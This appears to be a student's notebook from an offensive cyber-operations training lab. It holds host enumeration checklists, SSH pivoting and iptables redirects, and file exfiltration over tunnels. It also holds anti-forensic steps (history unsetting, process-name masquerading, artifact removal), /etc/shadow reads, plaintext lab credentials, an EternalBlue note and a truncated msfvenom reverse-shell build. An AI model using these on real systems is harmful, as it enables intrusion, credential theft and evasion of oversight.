/>--Enable IPTABLES Forwarding:<br />sudo sysctl -w net.ipv4.ip_forward=1<br /><br />--Check for iptables rules<br />sudo iptables -L / sudo iptables -t nat -L -nv<br /><br />--Replacement for LS<br />vdir -lisa<br /><br />--Find Linux Program Versions<br />● rpm -qa|grep &lt;programName&gt;<br />● apt-cache show &lt;programName&gt;<br />● apt policy &lt;programName&gt;<br /><br />--Find Windows Program Versions<br />Look in AppData, Program files, ETC<br />---E.g. Kaspersky 20.1.2 folder<br /><br />Remove Dynamic Port Forward from T#:<br />ssh -S /tmp/05_T# -Nf dummy@dummy -O cancel -D 9050<br /><br />Add Dynamic or Local Port Forward to T#:<br />ssh -S /tmp/05_T# -Nf dummy@dummy -O forward -D 9050<br /><br />Example:<br />ssh -S /tmp/05_T2 -Nf dummy@dummy -O cancel -L 5005:10.145.117.16:22013<br />ssh -S /tmp/05_T2 -Nf dummy@dummy -O forward -L 5005:10.145.117.16:22012<br /><br />--IF TARGET HUNG (CREATE SLAVE CONNECTION)<br />ssh -S /tmp/T5 dummy@dummy<br /><br /><br /><br /><br /><br />• <br />--SCP Commands:<br /><br />scp -o ControlPath=/tmp/T5 -P 5005 -T student5@127.1:&quot;/etc/file4.txt&quot; T5_file4.txt<br /><br />Multiple of one type of file:<br />scp -vvv -o ControlPath=/tmp/T5 -P 5005 -r student5@127.1:&#39;&quot;C:\Program Files\Common Files\system\ado\*.dll&quot;&#39; ~/McCoy/MM8_T5<br /><br />All files in a directory:<br />scp -o ControlPath=/tmp/T4 -P 5004 -r student5@127.1:&quot;C:\Windows\Prefetch&quot; ~/McCoy/MM6<br /><br />ssh -S /tmp/T5  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 5005 dummy@dummy &quot;sudo cat /root/file2.txt&quot; &gt; T5_file2.txt<br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Linux</h1><br/>Message MC<br /><br />date; date -u<br />whoami &amp;&amp;  id &amp;&amp;  w<br />sudo cat /root/.bash_history<br />ifconfig<br />uname -a &amp;&amp; cat /etc/*rel*<br />ls -la /etc/*syslog* <br />cat /etc/rsyslog.conf | grep @<br />sudo netstat -auntp<br />ps -elfH <br />ls -latr /<br />ls -latr /tmp<br />ls -latr .<br />ls -latr ..<br />sudo ls -latr /root<br />df<br />sudo ls -latr /var/*acc*<br />ls -latr /var/*log*/<br />sudo ls -latr /var/log/*<br />for user in $(cut -f1 -d: /etc/passwd); do echo &quot;###### $user crontab is:&quot;; cat /var/spool/cron/{crontabs/$user,$user} 2&gt;/dev/null; done<br />sudo ls -latr /var/spool/cron<br />cat /etc/crontab<br />ls -la /etc/cron.*<br />sestatus<br />getenforce<br />cat ~/.bash_history<br />cat /var/log/* | grep $USER<br />date<br />find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -14 -type f -print0 | xargs -0 ls -latr <br /><br /><br /><br /><br /><br />Before Disconnect:<br />REMOVE ARTIFACTS<br />Update Vet Disco Time Notes<br />Update MC<br /><br /><br />ls -latr /tmp<br />ps -elfH<br />sudo netstat -lptn<br />ls -latr /var/log<br />w<br />date<br />find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -120 -type f -print0 | xargs -0 ls -latr<br /><br /><br />Update Disco Time Notes<br />Message MC<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />w<br />sudo cat /root/.bash_history<br />ls -la /etc/*syslog* <br />cat /etc/rsyslog.conf<br />sudo netstat -natup<br />ps -elfH <br />ls -latr /<br />ls -latr /tmp<br />ls -latr .<br />ls -latr ..<br />sudo ls -latr /var/*acc*<br />sudo ls -latr /var/spool/cron<br />cat /etc/crontab<br />ls -la /etc/cron.*<br />sestatus</div><div class='page'><h1 class='title level-6'>For me</h1><br/>date<br />cpu useage<br />    dmidecode   <br />    free<br />    top<br />disk usage<br />    fdisk<br />    du<br />    df              &lt;prints mounted file systems<br />    quota<br />    mount<br />    lspci        &lt;list pci bridges?? ask<br />    lsblk       &lt;list partitions<br />    lsusb       &lt;list attached usb&#39;s ??ask<br />network<br />    ifconfig<br />    ip a<br />    hostname<br />    uname -a<br />    cat /etc/ *rel*<br />processes<br />    ps -elfH<br />    lsof   &lt; malware mando<br />net connections<br />    ss -natup<br />    ss -A tcp,udp,packet<br />    netstat -natup<br />Files<br />    file<br />    strings<br />Jobs<br />    jobs<br />    cat /etc/crontab<br />Time<br />    modified time = change of contets of file<br />    access time = last time data of file was accessed<br />    change time = change of metadate (name, size, permissions)<br />touch<br />    -m update modify time<br />    -t update access and modify time<br />    nothing updates everything<br />    -a updates access only<br />    -r use another files times<br />stat<br />    shows files stat<br />    <br /><br /><br /><br /><br /><br /><br /><br /><br /><br />for i in `find /etc/*syslog* -type f | cut -d&quot;:&quot; -f 1`; do echo; echo &quot;==========$i==========&quot;; ls -l &quot;$i&quot;; cat -n &quot;$i&quot; 2&gt;&amp;1;done<br /><br />for i in `find /etc/cron* -type f | cut -d&quot;:&quot; -f 1`; do echo; echo &quot;==========$i==========&quot;; ls -l &quot;$i&quot;; sudo cat -n &quot;$i&quot; 2&gt;&amp;1;done<br /><br />Hash all files in dir and subdir<br />find . -type f -print0 | xargs -0 md5sum</div><div class='page'><h1 class='title level-6'>QuickPaste</h1><br/>On Connect:<br />date; date -u<br />whoami &amp;&amp;  id &amp;&amp; w<br />uname -a &amp;&amp; cat /etc/*rel*<br />ifconfig &amp;&amp; netstat -auntp<br />ps -elfH <br />ls -latr / &amp;&amp; ls -latr /tmp &amp;&amp; ls -latr . &amp;&amp; ls -latr ..<br />sudo ls -latr /root<br />df<br />sudo ls -latr /var/*acc* &amp;&amp; ls -latr /var/*log*/ &amp;&amp; ls -latr /var/log/*<br />ls -la /etc/*syslog* <em>read </em><em><span style="text-decoration:underline;">all</span></em><em> the config files</em><br />for user in $(cut -f1 -d: /etc/passwd); do echo &quot;###### $user crontab is:&quot;; cat /var/spool/cron/{crontabs/$user,$user} 2&gt;/dev/null; done<br />sestatus<br />getenforce<br />sudo cat /root/.bash_history &amp;&amp; cat ~/.bash_history<br /><br />find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -&lt;<strong>duration since initial connection</strong>&gt; -type f -print0 | xargs -0 ls -latr (NOTE there is a &quot;-&quot; a.k.a minus symbol preceding the &quot;&lt;duration since initial connection&quot;&gt;<br />sudo ls -latr /var/spool/cron<br />    tail -n 1000 &lt;files in /var/spool/cron/&gt;<br />cat /var/log/* | grep <em>[logged in user account]</em><br />sudo cat /etc/crontab &amp;&amp; sudo ls -la /etc/cron.*<br />    As needed, examine the files/scripts shown in the directory listing of the cron.* directories<br /><br /><br />Before Disconnect:<br />ls -latr /tmp<br />ps -elf<br />netstat -lptn<br />ls -latr /var/log<br />w<br />find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -&lt;<strong>yourminutesontarget</strong>&gt; -type f -print0 | xargs -0 ls -latr</div><div class='page'><h1 class='title level-6'>Survey</h1><br/>Message MC<br />Message analyst<br />Timestamp OpNotes Start<br /><br />mount<br />lsmod<br />uname -a<br />ls -latr /etc/*release*<br />cat /etc/*release*<br />cat /proc/cpuinfo<br />services --status-all || systemctl status --no-pager<br />cat /proc/meminfo<br />cat /etc/shadow<br />cat /etc/passwd<br />lspci -vv<br />arp -a<br />lsusb<br />lsblk<br />fdisk -l<br />free -m<br />dmidecode -t bios<br />#ls -alR / (make sure scrollback limit is set to MAX on terminal)<br /><br /><br /><br /><br />Survey_&lt;IP_Address&gt;<br />TimeStamp Opnotes Finish<br />Message Analyst<br />Message MC<br /><br /><br /></div><div class='page'><h1 class='title level-5'>Windows</h1><br/>Message MC<br /><br />date /t<br />time /t<br />query user<br />tasklist /V<br />auditpol /get /category:*<br />ipconfig /all<br />netstat /anob<br />netstat -napo tcp<br />netsh advfirewall show allprofiles<br />net share<br />reg query hklm\software\microsoft\windows\currentversion\run<br />reg query hklm\software\microsoft\windows\currentversion\runonce<br />reg query hklm\software<br />at<br />schtasks /query /v<br />dir /o:d /t:w c:\<br />dir /o:d /t:w c:\windows\temp<br />dir /o:d /t:w c:\windows\<br />dir /o:d /t:w c:\windows\system32<br />dir /o:d /t:w c:\windows\system32\winevt\logs<br />dir /o:d /t:w &quot;%appdata%\microsoft\windows\start menu\programs\startup&quot;<br />wevtutil qe security /c:25 /rd:true /f:text <br /><br /><br /><br /><br />On Disconnect:<br />REMOVE ARTIFACTS<br />Update Disco TIme on Notes<br />Message MC<br /><br /><br />dir /o:d /t:w c:\windows\temp<br />dir /o:d /t:w c:\windows\system32\winevt\logs<br />wevtutil qe security /c:25 /rd:true /f:text <br />netstat /anob<br />tasklist -v<br />query user<br /><br /><br />Update Disco Time on Notes<br />Message MC<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />wmic process get processid,parentprocessid,executablepath | findstr 1552<br /><br /><br /><br /><br />netsh advfirewall show allprofiles<br />query user<br />tasklist /V<br />reg query hklm\software\microsoft\windows\currentversion\run<br />reg query hklm\software\microsoft\windows\currentversion\runonce<br />reg query hklm\software<br />dir /o:d /t:w c:\<br />dir /o:d /t:w c:\windows\temp<br />dir /o:d /t:w c:\windows\</div><div class='page'><h1 class='title level-6'>For Me</h1><br/>schtasks /fo csv | findstr /i ready | findstr /iv N/A<br /><br />gci -path c:\windows\system32 | sort-object LastWriteTime | select-object -Last 10<br /><br />for %F in (*) do @certutil -hashfile &quot;%F&quot; MD5</div><div class='page'><h1 class='title level-6'>Survey</h1><br/>Message MC<br />Ask for permission to load windows managment console. (WMIC)<br />TimeStamp OpNotes Start<br /><br /><br />systeminfo<br />net user<br />net localgroup<br />net session<br />net start<br />type %systemroot%\system32\drivers\etc\hosts<br />arp -a<br />route print<br />driverquery /v<br />wmic baseboard get Manufacturer, Model, PRoduct, SerialNumber, Version<br />wmic cpu get deviceID, Addresswidth, MaxClockSpeed, Name, Manufacturer<br />wmic logicaldisk get name, freespace, systemname, filesystem, size, volumeserialnumber<br />wmic path Win32_VideoController get caption, CurrentHorizontalResolution, CurrentVerticalResolution, Description, DriverVersion, AdapterRAM /format:list<br />wmic printer list full<br />wmic path win32_pnpentity where &quot;ConfigManagerErrorCode&lt;&gt;0&quot; get Name, PNPDeviceID<br />wmic qfe list full<br />wmic service list full<br />wmic product get Caption, InstallDate, Vendor<br />wmic useraccount where &quot;LocalAccount=&#39;TRUE&#39;&quot; get Caption, Disabled, Domain, Lockout, PasswordExpires, SID, Status<br />#tree c:\<br /><br /><br /><br /><br /><br />Survey_&lt;IP_Address&gt;<br />TimeStamp OpNotes Finish<br />Message Analyst<br />Message MC<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />T7 Survey Complete. Data in Survey_192.168.117.107. FollowOn value exists as This is likley an admnistrators machine.<br /><br /><br />Survey Complete. Followon Value reccomended.<br /><br /><br />:set noswapfile</div><div class='page'><h1 class='title level-4'>Tools & Techniques</h1><br/></div><div class='page'><h1 class='title level-5'>iptables</h1><br/>lsmod | grep ip_tables<br />lsmod | grep x_tables<br /><br />sudo iptables -L (list rules)<br />sudo iptables -t nat -L<br /><br />sysctl net.ipv4.ip_forward      &lt; check if iprouting is enabled<br />sysctl -w net.ipv4.ip_forward=1     &lt; enable iprouting<br /><br />sudo iptables -L -t nat --line-number<br />sudo iptables -t nat -D POSTROUTING 1<br />sudo iptables -t nat -D PREROUTING 1<br /><br />PREROUTING<br />sudo iptables -t nat -A PREROUTING -p tcp -s 10.50.21.220 --dport 10200 -j DNAT --to-destination 192.168.0.10:22<br /><br />POSTROUTING<br />sudo iptables -t nat -A POSTROUTING -s 10.50.21.220 -p tcp -j SNAT --to-source 192.168.0.99<br /><br />ssh -M -S /tmp/t2  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null studentxx@10.50.30.20 -p 10200<br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-6'>Example</h1><br/>T1: ssh -M -S /tmp/t1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null studentxx@10.50.30.20 -p 22<br />iptables -t nat -A PREROUTING -p tcp --dport 10200 -j DNAT --to-destination 192.168.0.10:22<br />iptables -t nat -A PREROUTING -p tcp --dport 10300 -j DNAT --to-destination 192.168.0.10:10300<br />iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.10:10400<br /><br />iptables -t nat -A POSTROUTING -s 10.50.21.220 -p tcp -j SNAT --to-source 192.168.0.99<br /><br /><br />T2: ssh -M -S /tmp/t2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null studentxx@10.50.30.20 -p 10200<br />iptables -t nat -A PREROUTING -p tcp --dport 10300 -j DNAT --to-destination 192.168.0.23:22<br />iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.13:10400<br /><br />iptables -t nat -A POSTROUTING -s 192.168.0.99 -p tcp -j SNAT --to-source 192.168.0.10<br /><br /><br />T3:  ssh -M -S /tmp/t3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null studentxx@10.50.30.20 -p 10300<br />iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.13:22<br /><br />iptables -t nat -A POSTROUTING -s 192.168.0.10 -p tcp -j SNAT --to-source 192.168.0.23<br /><br /><br />T4: ssh -M -S /tmp/t4 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null studentxx@10.50.30.20 -p 10400<br /><br /><br />kali:10.50.21.220<br />&gt;T1: 10.50.30.20 / 192.168.0.99<br />-&gt; T2: 192.168.0.10<br />--&gt; T3: 192.168.0.23<br />---&gt; T4: 192.168.0.13</div><div class='page'><h1 class='title level-5'>Tunneling</h1><br/>ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@40.0.0.101<br />ssh -S /tmp/t1 dummy@127.0.0.1 (dummy@127.0.0.1 is just a placeholder. does nothing)<br /><br /><br />scp -o ControlPath=/tmp/t1 dummy@127.0.0.1:/home/bob/room/lp.py /root/Desktop/<br /><br /><br />ssh -S /tmp/t1 dummy@127.0.0.1 -O forward -R5157:127.0.0.1:4444<br />ssh -S /tmp/t1 dummy@127.0.0.1 -O cancel -R5157:127.0.0.1:4444<br /><br /><br />You will only use Reverse if something is beaconing out of the target and you want to catch it.<br /><br />scp -o ControlPath=/tmp/t5 dummy@127.0.0.1:&quot;\&quot;C:\Users\hugh.payne\My Documents\smbserver notes.rtf\&quot;&quot; .<br />scp -r -o ControlPath=/tmp/t2 dummy@127.0.0.1:&quot;\&quot;C:\windows\prefetch\&quot;&quot; .<br /><br /><br /></div><div class='page'><h1 class='title level-6'>Class Notes</h1><br/>-&gt; host1<br />--&gt; host2<br />----&gt; host3<br /><br />host1<br />----------<br />ssh user@host1 -M -S /tmp/host1.sock #Multiplexed<br /><br />ssh user@host1 -S /tmp/host1.sock #Interactive<br /><br />#Create tunnel associated with Multiplexed socket /tmp/host1.sock Kali port 2222 going through host to port 22<br />ssh user@host1 -S /tmp/host1.sock -O forward -L2222:host2:22 # noninteractive<br />ssh user@host1 -S /tmp/host1.sock -L2222:host2:22 # interactive<br /><br />ssh user@host -S /tmp/host1.sock -O forward -R32123:127.0.0.1:4444 # noninteractive REMOTE listener to local nc on 4444<br />nc -lp 4444<br />ssh user@host -S /tmp/host1.sock -O cancel -R32123:127.0.0.1:4444 # noninteractive CLOSE REMOTE listener<br /><br /><br />host2<br />----------<br />ssh user@127.0.0.1 -p 2222 -M -S /tmp/host2.sock # Multiplexed<br /><br />ssh user@127.0.0.1 -p 2222 -S /tmp/host2.sock # Interactive<br /><br />ssh user@127.0.0.1 -p 2222 -S /tmp/host2.sock -L3333:host3:22 # interactive forward tunnel for connecting to next host<br /><br />host3<br />-----------<br />ssh user@127.0.0.1 -p 3333 -M -S /tmp/host3.sock # Multiplexed<br /><br />ssh user@127.0.0.1 -p 3333 -S /tmp/host3.sock # Interactive</div><div class='page'><h1 class='title level-6'>netsh</h1><br/>#Must be admin to use netsh<br />#View current port proxies<br />netsh interface portproxy show all<br /><br />#Create a portproxy<br />netsh interface portproxy set v4tov4 listenport=3232 connectaddress=github.com connectport=443 protocol=tcp<br />#could be used to expose internal port#<br /><br />#Verify portproxy is listening<br />netstat -nato | findstr 3232<br /><br />#View portproxy in reg<br />reg query hklm\system\currentcontrolset\services\portproxy /s<br /><br />#Delete a portproxy<br />netsh interface portproxy delete v4tov4 listenport=3232 protocol=tcp<br />netsh interface portproxy delete v4tov4 listenport=10500 listenaddress=192.168.0.9 protocol=TCP<br /><br /><br /><br /><br /><br />netsh interface portproxy delete v4tov4 listenport=10300 listenaddress=192.168.0.12 protocol=TCP</div><div class='page'><h1 class='title level-5'>Scp</h1><br/>if you need to sudo...<br />ssh user@ip &quot;cat file&quot; &gt; file.txt<br /><br /><br />scp -o ControlPath=/tmp/t5 -T &#39;studentxx@127.0.0.1:&quot;C:\Program Files\Common Files\system\ado\*.dll&quot;&#39; T5_ADO<br /><br />scp -r -o ControlPath=/tmp/t2 dummy@127.0.0.1:&quot;\&quot;C:\windows\prefetch\*.dll&quot;&quot; .<br /><br />ssh -S /tmp/t6 a &quot;sudo -S cat /etc/shadow&quot; &gt; shadow<br /><br />ssh -p 22 squid@192.168.21.122 -D 127.0.0.1:9050<br /><br /><br /><br />scp -T -r -o ControlPath=/tmp/t5 &#39;dummy@127.0.0.1:&quot;c:\program files (x86)\hmailserver\data\workgroup\*&quot;&#39; .</div><div class='page'><h1 class='title level-4'>Missions</h1><br/></div><div class='page'><h1 class='title level-3'>BOC_Pre</h1><br/>Make sure everyone can access rcs00-portal.pcte.mil<br />Get roster.<br /><br />In addition to course reccomend<br />Pretty darn valuable:<br />	tmux<br />	vim<br />	CyberPlummbers handbook<br />Less important but still valuable:<br />	findstr<br />	grep<br />	<br />	<br />CPH Link: <a href="https://drive.google.com/file/d/1EuXtxChMwWi5L2g_ySL86pjRlPAvvVBz/view?usp=sharing">https://drive.google.com/file/d/1EuXtxChMwWi5L2g_ySL86pjRlPAvvVBz/view?usp=sharing</a><br /></div><div class='page'><h1 class='title level-2'>Chiron</h1><br/></div><div class='page'><h1 class='title level-3'>ATME</h1><br/>mpappas@chirontech.com<br />instructors@chirontech.com<br /><br />unset HISTFILE HISTSIZE HISTFILESIZE<br /><br />PATH hijacking<br /><br />whatis (one line description of binary)<br /><br />file (describe what kind of file it is (binary, python etc...)<br /><br />if something is in ps -ef and is not in /proc, it is running in memory only<br /><br />Change a process&#39;s name<br />ps -ef | grep $$<br />exec -a ‘[kworker /u9:0]’ /bin/bash<br />ps -ef | grep $$<br /><br />check for syslog (rsyslog) and cron jobs to forward logs.<br /><br />cat /etc/*{release,issue,edition,version}* 2&gt; /dev/null<br /><br />mount    (check mount points) <br /><br /><br /><br />rdesktop -g 80% -u anna -p J@nuary2016 -d DEIMUSTECH 192.168.12.14</div><div class='page'><h1 class='title level-4'>OSINT</h1><br/><div class="codebox"><div class="codebox">nslookup&nbsp;yeet.com<br /><br />host&nbsp;-a&nbsp;yeet.com<br /><br />dmitry&nbsp;-i&nbsp;-w&nbsp;-n&nbsp;-s&nbsp;-e&nbsp;-o&nbsp;targets.acme/dmitry.txt&nbsp;yeet.com<br /><br />https://github.com/leebaird/discover&nbsp;(discover)&nbsp;(dorking?)<br />&nbsp;&nbsp;&nbsp;&nbsp;goofile&nbsp;-d&nbsp;yeet.com&nbsp;-f&nbsp;pdf<br />&nbsp;&nbsp;&nbsp;&nbsp;googmail&nbsp;yeet.com<br /></div></div></div><div class='page'><h1 class='title level-4'>Scanning</h1><br/>pingsweep<br />nmap -sn 172.16.15.15<br /><br />common ports &amp; SYN stealth scan<br />nmap -sS -v -n --top-ports 500 172.16.15.15 --open<br /><br />Ack scan to detect firewall filtering ports<br />nmap -sS -v -n 172.16.15.15<br /><br />nmap ssh version scanner<br />use auxiliary/scanner/ssh/ssh_version<br /><br />nmap http version scanner<br />use auxiliary/scanner/http/http_version<br /><br /></div><div class='page'><h1 class='title level-4'>NixPriv</h1><br/>Crons</div><div class='page'><h1 class='title level-4'>Linux SA</h1><br/>date<br />ps -ef | grep $$        (determine current process)<br />whcih bash              (determine type of shell)<br />echo $PATH             (determine path)<br /><br />#Danger Checks<br />getenforce || sestatus          (determines status of SELinux)<br />ps -ef | grep -i audit[d]         (determins audit logging)<br />auditctl -l                             (determines logon time logging)<br />/var/log/pacct or /var/log/account/pacct    (these files log process&#39;s that are started on the system)<br />#unset HISTFILE HISTSIZE HISTFILESIZE<br /><br />#Traditional SA<br />w               (who else is logged in)<br />id<br />whoami<br />groups<br />hostname<br />ip addr sho (ifconfig -a)<br />ps -ef<br />netstat -napot<br />cat /etc/*{release,issue,edition,version}* 2&gt; /dev/null<br />mount    (check mount points) <br />df          (check mount points easier)<br /></div><div class='page'><h1 class='title level-4'>Windows SA</h1><br/>get-date<br /><br />rdesktop -g 80% -u anna -p J@nuary2016 -d DEIMUSTECH 192.168.12.14</div><div class='page'><h1 class='title level-5'>HostEnumScript</h1><br/><br /><br /><div class="codebox"><div class="codebox">#sa<br />#Get-WmiObject&nbsp;win32_OperatingSystem&nbsp;|&nbsp;Format-List&nbsp;#PSComputerName&nbsp;###Hostname<br />#Get-WmiObject&nbsp;-Class&nbsp;Win32_NetworkAdapterConfiguration&nbsp;|&nbsp;where-object&nbsp;{&nbsp;$_.IPAddress&nbsp;}&nbsp;|&nbsp;Format-Table&nbsp;&nbsp;&nbsp;###ipconfig<br />#$PID&nbsp;&nbsp;&nbsp;&nbsp;###get&nbsp;pid<br />#Get-PSHostProcessInfo&nbsp;&nbsp;&nbsp;&nbsp;###get&nbsp;process<br />#([Security.Principal.WindowsIdentity]::GetCurrent()).Name&nbsp;&nbsp;&nbsp;&nbsp;###Get&nbsp;Username<br />#Write-Output&nbsp;&quot;Currently&nbsp;have&nbsp;administrative&nbsp;rights:&quot;;&nbsp;([Security.Principal.WindowsPrincipal]&nbsp;[Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]&nbsp;&quot;Administrator&quot;)&nbsp;&nbsp;&nbsp;###Check&nbsp;if&nbsp;shell&nbsp;has&nbsp;admin&nbsp;rights<br /><br />#Security<br />#Get-Process<br />#get-service&nbsp;|&nbsp;where-object&nbsp;{&nbsp;$_.Status&nbsp;-eq&nbsp;&#39;running&#39;}&nbsp;&nbsp;&nbsp;###Loog&nbsp;for&nbsp;antivirus<br />#get-childitem&nbsp;HKLM:\SOFTWARE\&nbsp;&nbsp;&nbsp;###Find&nbsp;major&nbsp;version&nbsp;of&nbsp;antivirus<br />#get-itemproperty&nbsp;HKLM:\SOFTWARE\yeet\cannon&nbsp;&nbsp;&nbsp;###find&nbsp;minor&nbsp;version&nbsp;of&nbsp;antivirus<br /><br />#logging<br />#get-logproperties&nbsp;security&nbsp;|&nbsp;format-list&nbsp;enabled&nbsp;&nbsp;&nbsp;###is&nbsp;auditing&nbsp;enabled<br />#auditpol&nbsp;/get&nbsp;/category:*&nbsp;&nbsp;&nbsp;###check&nbsp;eventlog&nbsp;(need&nbsp;admin,&nbsp;uses&nbsp;external&nbsp;binary)<br />#get-eventlog&nbsp;security&nbsp;-Newest&nbsp;20&nbsp;&nbsp;&nbsp;###view&nbsp;security&nbsp;event&nbsp;logs<br /><br />#OS&nbsp;and&nbsp;hardware<br />#Get-ComputerInfo&nbsp;&nbsp;&nbsp;###Lots&nbsp;o&nbsp;shit<br />#$psversiontable&nbsp;&nbsp;&nbsp;&nbsp;###version&nbsp;of&nbsp;powershell<br />#Get-WmiObject&nbsp;-class&nbsp;Win32_LogicalDisk&nbsp;-Filter&nbsp;&#39;DriveType=3&#39;&nbsp;|&nbsp;Format-Table&nbsp;DeviceID,&nbsp;Size,&nbsp;FreeSpace&nbsp;&nbsp;&nbsp;###Drive&nbsp;info<br />#Get-WmiObject&nbsp;-Class&nbsp;Win32_processor&nbsp;|&nbsp;select-object&nbsp;name,&nbsp;Loadpercentage&nbsp;&nbsp;&nbsp;###Processor&nbsp;info&nbsp;including&nbsp;load&nbsp;info<br />#Get-WmiObject&nbsp;-class&nbsp;win32_operatingsystem&nbsp;|&nbsp;Foreach-object&nbsp;{&quot;{0:N2}%&quot;&nbsp;-f&nbsp;((($_.TotalVisibleMemorySize&nbsp;-&nbsp;$_.FreePhysicalMemory)*100)/$_.TotalVisibleMemorySize)}&nbsp;&nbsp;&nbsp;###&nbsp;%&nbsp;of&nbsp;ram&nbsp;used<br />#netstat&nbsp;-ano&nbsp;&nbsp;&nbsp;###netstat<br />#netstat&nbsp;-anob&nbsp;&nbsp;&nbsp;###netstat<br /><br />#Persistance&nbsp;Check<br />#Get-ItemProperty&nbsp;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&nbsp;&nbsp;&nbsp;###Check&nbsp;for&nbsp;unusal&nbsp;run&nbsp;key&nbsp;entry<br />#Get-ItemProperty&nbsp;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Runonce&nbsp;&nbsp;&nbsp;###Check&nbsp;for&nbsp;unusal&nbsp;run&nbsp;key&nbsp;entry<br />#Get-ItemProperty&nbsp;HKcu:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&nbsp;&nbsp;&nbsp;###Check&nbsp;for&nbsp;unusal&nbsp;run&nbsp;key&nbsp;entry<br />#Get-ItemProperty&nbsp;HKcu:\SOFTWARE\Microsoft\Windows\CurrentVersion\Runonce&nbsp;&nbsp;&nbsp;###Check&nbsp;for&nbsp;unusal&nbsp;run&nbsp;key&nbsp;entry<br />#Get-ItemProperty&nbsp;&quot;HKLM:\SOFTWARE\Microsoft\Windows&nbsp;nt\CurrentVersion\Winlogon&quot;&nbsp;&nbsp;&nbsp;###Unusual&nbsp;run&nbsp;key&nbsp;entry<br />#Get-ItemProperty&nbsp;&quot;HKcu:\SOFTWARE\Microsoft\Windows&nbsp;nt\CurrentVersion\Winlogon&quot;&nbsp;&nbsp;&nbsp;###Unusual&nbsp;run&nbsp;key&nbsp;entry<br />#at&nbsp;&nbsp;&nbsp;###schtasks&nbsp;check<br />#schtasks&nbsp;/query&nbsp;/V&nbsp;/FO&nbsp;list&nbsp;|&nbsp;more&nbsp;&nbsp;&nbsp;###schtasks&nbsp;check<br />#Get-ChildItem&nbsp;&#39;C:\programdata\Microsoft\Windows\Start&nbsp;menu\programs\startup&#39;&nbsp;&nbsp;&nbsp;###Check&nbsp;startup&nbsp;Folder<br /><br />###check&nbsp;each&nbsp;users&nbsp;startup&nbsp;folder<br />&quot;&quot;&quot;<br />$names&nbsp;=&nbsp;Get-ChildItem&nbsp;C:\users&nbsp;|&nbsp;where-object&nbsp;{&nbsp;$_.Name&nbsp;-ne&nbsp;&#39;Public&#39;&nbsp;-and&nbsp;$_.Name&nbsp;-ne&nbsp;&#39;default&#39;&nbsp;}&nbsp;|&nbsp;select&nbsp;{&nbsp;$_.Name}<br />foreach&nbsp;($name&nbsp;in&nbsp;$names){<br />&nbsp;&nbsp;&nbsp;&nbsp;$test&nbsp;=&nbsp;Get-ChildItem&nbsp;(&#39;C:\users\&#39;&nbsp;+&nbsp;($name.&#39;&nbsp;$_.Name&nbsp;&#39;)&nbsp;+&nbsp;&#39;\Appdata\Roaming\microsoft\Windows\Start&nbsp;Menu\Programs\Startup&#39;)&nbsp;-ErrorAction&nbsp;SilentlyContinue<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($test-ne&nbsp;$null){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get-ChildItem&nbsp;(&#39;C:\users\&#39;&nbsp;+&nbsp;($name.&#39;&nbsp;$_.Name&nbsp;&#39;)&nbsp;+&nbsp;&#39;\Appdata\Roaming\Microsoft\Windows\Start&nbsp;Menu\Programs\Startup&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}}<br />&quot;&quot;&quot;<br />#Get-WmiObject&nbsp;win32_service&nbsp;|&nbsp;where-object&nbsp;{&nbsp;$_.StartMode&nbsp;-eq&nbsp;&#39;Auto&#39;&nbsp;}&nbsp;|&nbsp;format-list&nbsp;Name,&nbsp;DisplayName,&nbsp;PathName&nbsp;&nbsp;&nbsp;###services<br />#get-childitem&nbsp;-path&nbsp;C:\&nbsp;-recurse&nbsp;|&nbsp;Where-Object&nbsp;{&nbsp;$_.LastWriteTime&nbsp;-ge&nbsp;(Get-Date).AddMinutes(-60)&nbsp;}&nbsp;###Loffing&nbsp;Check<br /></div></div></div><div class='page'><h1 class='title level-3'>CNO Attack & Defend</h1><br/>rpeters@chirontech.com<br />instructors@chirontech.com<br /><br /><br />192.168.202.9 - me<br />192.168.202.2<br />192.168.202.3<br /><br /><br /></div><div class='page'><h1 class='title level-4'>192.168.202.3 -LOWE</h1><br/>nmap -sn 192.168.202.3 (pingsweep)<br />nmap -sS -v -n --top-ports 500 192.168.202.3 --open (see open ports quick)<br />nmap -sS -v -n 192.168.202.3 (check for firewall)<br />nmap -p 135,139,445,3389,5357,49152,49153,49154,49156,49157 -A 192.168.202.3<br />nmap --script=smb-vuln 192.168.202.3<br /><br />eternal blue wins it<br /><br />local admin:Chiron123!!!<br />domain admin:ICO_passw0rd<br /><br /><br />to find DC<br />net view<br />nslookup &gt; set type=all &gt; _ldap._tcp.dc_msdcs<br />set l 			(L  Finds env var for LOGONSERVER)<br /></div><div class='page'><h1 class='title level-4'>192.168.202(201).2 FORD</h1><br/>DC<br /><br />from LOWE<br />net use \\FORD\ADMIN$<br />msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ens192 lport=3231 -f exe -a x64 -o msspool64.exe<br />file msspool64.exe<br />use 